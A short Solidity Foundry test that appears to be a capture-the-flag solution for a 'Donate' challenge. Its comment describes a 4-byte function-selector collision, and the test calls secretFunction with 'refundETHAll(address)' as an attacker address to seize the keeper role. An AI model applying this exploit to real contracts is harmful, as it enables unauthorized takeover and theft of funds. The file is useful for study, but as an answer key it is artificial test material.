// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

/**
 * @title   Answer to the Donate Challenge
 * @notice  The vulnerable contract allow an to call itself with an arbitrary function signature
 *          and check the whole hash of the function prototype (ie not only the 4 first bytes).
 *          The exploit is to find another function with the same signature (ie the same 4 first bytes)
 *          which will not have the same keccak hash (only 4 bytes allows easy collision)
 *          https://openchain.xyz/signatures?query=0x09779838 RefundETHAll(address) collides
 * @author  DrGorilla.eth
 */
contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

function testhack() public {
    vm.startPrank(hacker);
    donate.secretFunction("refundETHAll(address)");
    assertTrue(donate.keeperCheck());
    }
}